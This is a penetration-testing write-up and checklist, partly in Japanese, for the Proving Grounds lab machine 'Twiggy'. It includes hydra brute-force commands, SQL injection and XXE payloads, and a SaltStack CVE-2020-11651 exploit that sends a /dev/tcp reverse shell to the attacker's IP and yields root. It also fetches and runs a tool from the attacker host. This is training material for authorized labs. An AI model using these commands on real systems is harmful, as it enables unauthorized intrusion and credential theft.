# Twiggy

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 192.168.59.62  |
| Local IP          | 192.168.49.59   |
| Local listen port | 80 |

## Credentials

- ssh
  - user:pass -i user_rsa
- http://{REMOTE_IP}/
  - user:pass

## Port scan

### RustScan

- [x] Full TCP port scan

```bash
┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg]
└─$ rustscan -a 192.168.59.62 --ulimit 5000 --timeout 2000 -- -sV -A -oN rustscan_result.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/funa/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.59.62:22
Open 192.168.59.62:53
Open 192.168.59.62:80
Open 192.168.59.62:4505
Open 192.168.59.62:4506
Open 192.168.59.62:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

<snip>

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZz8rKSxgnT5mqHeBPqGlXFj2JJdq21roV/2M8/+0F5/5D1XsaXmbktDpKILFdBcYnLtPxWstxPq+FTbWAJad2uk3BPYWRxidK2dOozE5rKLCyxtkEqs/lO09pM6VKQUi83y5wMwI+9Akkir0AMruuFUSpeCIBt/L98g8OYxzyTsylQATnPxJrrQOWGUQYAvX6jIs25n6d3rmbXk/crg1ZfAVFEHEeR9Y6Bjc2o5YWjMp3XbOZyC4yYseoM6eH2yCSDwu1DzPYrU6cNMfxBf863w1uyhiFk3eIb5jud3kfoxIq6t5JU2DXNhEd4rdXuuinZUSxWiCpHLZ1FCi4tkX5
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA1gj1q7mOswnou9RvKwuX8S7WFBhz2NlaSIpYPQmM0I/vqb4T459PgJcMaJOE+WmPiMnDSFsyV3C6YszM754Hc=
|   256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBzTSyInONbcDxdYULbDvI/HyrQm9m9M5b6Z825jnBEF
53/tcp   open  domain  syn-ack NLnet Labs NSD
80/tcp   open  http    syn-ack nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-favicon: Unknown favicon MD5: 11FB4799192313DD5474A343D9CC0A17
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    syn-ack ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    syn-ack ZeroMQ ZMTP 2.0
8000/tcp open  http    syn-ack nginx 1.16.1
|_http-title: Site doesn't have a title (application/json).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.98 seconds

```

### Nmap

- [x] Full TCP port scan

```bash
┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg]
└─$ nmap -p- -sV -A 192.168.59.62 -oN nmap_result.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-11 23:12 JST
Nmap scan report for 192.168.59.62
Host is up (0.25s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1054.73 seconds

```

- [x] Well-known UDP port scan

```bash
┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Twiggy]
└─$ sudo nmap -Pn -sU --min-rate=10000 192.168.59.62
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-11 23:12 JST
Nmap scan report for 192.168.59.62
Host is up.
All 1000 scanned ports on 192.168.59.62 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds

```

## TCP

### SSH - 22

| software name | version            | vulnerability |
| ------------- | ------------------ | ------------- |
| OpenSSH       | 7.4 (protocol 2.0) |               |

- [ ] Brute-force attack

  - [ ] default credentials

  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://192.168.59.62:22 -V -f -t 60
  ```

  - [ ] passwords list

    - [ ] username

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.59.62:22 -V -f -t 60
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login

  - [ ] `joe:joe`

  ```bash
  ssh joe@192.168.59.62 -p 22
  ```

  If `no matching host key type found` error occurs with this command, try the following.

  ```bash
  ssh -oHostKeyAlgorithms=+ssh-dss username@192.168.59.62
  ```

  ```bash
  ssh -oHostKeyAlgorithms=+ssh-rsa username@192.168.59.62
  ```

### DNS - 53

| software name  | version | vulnerability |
| -------------- | ------- | ------------- |
| NLnet Labs NSD |         |               |

### HTTP - 80

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |
|               |         |               |
|               |         |               |

#### Enumeration

- [ ] Directory buster
  - [ ] /


```bash
gobuster dir -f -u http://192.168.59.62:80/ -w /usr/share/wordlists/dirb/common.txt
```

If the web server we are attacking is configured to always respond with a 200 response code, try the following.

```bash
gobuster dir -f -u http://192.168.59.62:80/ -w /usr/share/wordlists/dirb/common.txt -b "200"
```

| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |

- [ ] Read the page source
- [ ] Check the cookie

#### Login brute force

- [ ] Default credentials
  - [ ] admin:admin
  - [ ] admin:password
  - [ ] administrator:administrator
  - [ ] administrator:password
  - [ ] root:root
  - [ ] root:password

- [ ] [Most common passwords](https://cybernews.com/best-password-managers/most-common-passwords/)
  - [ ] 123456
  - [ ] 123456789
  - [ ] qwerty

- [ ] Basic Authentication

  - [ ] default credentials

  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 80 -f 192.168.59.62 http-get /
  ```

  - [ ] passwords list

    - [ ] username

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -s 80 -f 192.168.59.62 http-get /
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

#### SQL

- [ ] [SQL Injection](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt)
  - [ ] admin' or '1'='1
  - [ ] admin" or "1"="1
  - [ ] admin") or ("1"="1

#### PHP

- [ ] PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```BurpSuite
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

#### XML

- [ ] [XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```BurpSuite
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### Hash crack

- [ ] /etc/.shadow

```bash
$ cat hash.txt
joe:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
john --show hash.txt
```

### ZMTP - 4505, 4506

| software name | version | vulnerability                                                |
| ------------- | ------- | ------------------------------------------------------------ |
| ZeroMQ ZMTP   | 2.0     | [Saltstack 3000.1 - RCE](https://www.exploit-db.com/exploits/48421) |

[Saltstack 3000.1 - RCE](https://www.exploit-db.com/exploits/48421) にあるコードを実行する．

```bash
┌──(l3ickey🥺kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Twiggy]
└─$ pip install salt
<snip>

┌──(l3ickey👽kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Twiggy]
└─$ python3.9 48421.py -m 192.168.59.62 --exec 'sh -i >& /dev/tcp/192.168.49.59/8000 0>&1'
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.59.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ZrEuX+4s2vjPreul8T7fKuLiPVbcJG1V6qXfyt1ZoNklQG2rjiIYQU4jSWmQqvwvMUL7WePDQe8=
[+] Attemping to execute sh -i >& /dev/tcp/192.168.49.59/8000 0>&1 on 192.168.59.62
[+] Successfully scheduled job: 20220612125158600876

```

`nc` でリバースシェルを受け取る．

```bash
┌──(l3ickey👽kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Twiggy]
└─$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [192.168.49.59] from (UNKNOWN) [192.168.59.62] 32862
sh: no job control in this shell
sh-4.2# id
id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# cat proof.txt
cat proof.txt
ec7e2637b844acd5af30d023ef3e7746

```

`proof.txt` を手に入れることができた．

### HTTP - 8000

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |
|               |         |               |
|               |         |               |

#### Enumeration

- [ ] Directory buster
  - [ ] /


```bash
gobuster dir -f -u http://192.168.59.62:80/ -w /usr/share/wordlists/dirb/common.txt
```

If the web server we are attacking is configured to always respond with a 200 response code, try the following.

```bash
gobuster dir -f -u http://192.168.59.62:80/ -w /usr/share/wordlists/dirb/common.txt -b "200"
```

| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |

- [ ] Read the page source
- [ ] Check the cookie

## Privilege Escalation

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 192.168.59.62  |
| Local IP          | 192.168.49.59   |
| Local listen port | 80 |

```bash
nc -lvp 80
```

### Linux Privilege Escalation

- [ ] Enumerate SUDO binaries

```bash
sudo -l
```

- [ ] Find SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

If the owner of the binary is `root`, check [GTFOBins](https://gtfobins.github.io/).

- [ ] Find files owned by any group

```bash
find / -group any_group -type f 2>/dev/null
```

- [ ] Check the `.htpasswd` credentials

```bash
$ pwd
/var/www/html
$ ls -a
.htaccess	.htpasswd
$ cat .htpasswd
username:password
```

- [ ] Check the network connections

```bash
netstat -tlpn
```

If the owner of the process is `root`, search prvesc.

- [ ] Enumerate scheduled jobs

  - [ ] cron job

  ```bash
  find / -name */cron -type d
  cat /etc/crontab
  ```

  - [ ] [pspy](https://github.com/DominicBreuker/pspy)

  ```bash local
  cd /opt/pentest-tools
  python3 -m http.server 80
  ```

  ```bash remote
  wget http://192.168.49.59:8000/pspy64
  chmod +x pspy64
  ./pspy64
  ```

- [ ] Check [PayloadsAllTheThings Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

## When you are stuck

- [ ] Are there any areas where you are guessing "it would be ____" without examining the details?

- [ ] Have you tried "all" the information available on the internet? 

